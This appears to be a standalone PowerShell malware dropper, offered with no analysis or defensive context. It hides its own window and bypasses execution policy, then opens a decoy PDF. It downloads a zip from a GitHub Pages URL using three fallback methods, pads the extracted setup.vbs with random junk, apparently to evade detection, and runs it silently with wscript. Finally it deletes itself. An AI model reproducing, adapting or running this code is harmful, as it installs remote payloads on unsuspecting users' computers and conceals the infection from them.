# ======================================================
# Self-hide: if not already running hidden, relaunch hidden and exit
# ======================================================
if ($env:__PS_HIDDEN_LAUNCH -ne "1") {
    $scriptPath = $MyInvocation.MyCommand.Path
    $env:__PS_HIDDEN_LAUNCH = "1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
    exit
}

# ======================================================
# Main script body (now running hidden)
# ======================================================
$urls = @("https://hiuier00304.github.io/MyAdsHome/2ndFile.zip")

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$prePath = Join-Path $scriptDir "ali.pdf"
if (Test-Path $prePath) {
    Start-Process -FilePath $prePath -Wait -WindowStyle Hidden
}

$tempDir = [System.IO.Path]::GetTempPath()

function Get-RandomString { 
    param($length) 
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Find-SetupVBS { 
    param($folder) 
    Get-ChildItem -Path $folder -Recurse -Filter "setup.vbs" -ErrorAction SilentlyContinue | 
        Select-Object -First 1 -ExpandProperty FullName
}

foreach ($url in $urls) {
    $randName = Get-RandomString -length 12
    $zipPath = Join-Path $tempDir "download_$randName.zip"
    $extractDir = Join-Path $tempDir "setup_$randName"
    $ts = "?t=" + [int]((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalMilliseconds)
    $fullUrl = $url + $ts
    $downloadSuccess = $false

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $fullUrl -OutFile $zipPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
        $downloadSuccess = $true
    } catch {
        try {
            Start-BitsTransfer -Source $fullUrl -Destination $zipPath -Priority Low -ErrorAction Stop
            $downloadSuccess = $true
        } catch {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $wc.DownloadFile($fullUrl, $zipPath)
                $downloadSuccess = $true
            } catch {}
        }
    }

    if (-not $downloadSuccess) { continue }

    if ((Get-Item $zipPath).Length -lt 1000) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue; continue }

    try {
        Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force -ErrorAction Stop
    } catch {
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        continue
    }

    $vbsPath = Find-SetupVBS -folder $extractDir
    if ($vbsPath) {
        # Add junk (100KB–700KB) as a comment line
        $junkSize = Get-Random -Minimum 102400 -Maximum 716800
        $junk = Get-RandomString -length $junkSize
        Add-Content -Path $vbsPath -Value ("'" + $junk)

        # Run the original setup.vbs silently
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    }

    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ======================================================
# Self-destruct: delete this script after a short delay
# ======================================================
$selfPath = $MyInvocation.MyCommand.Path
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force`"" -WindowStyle Hidden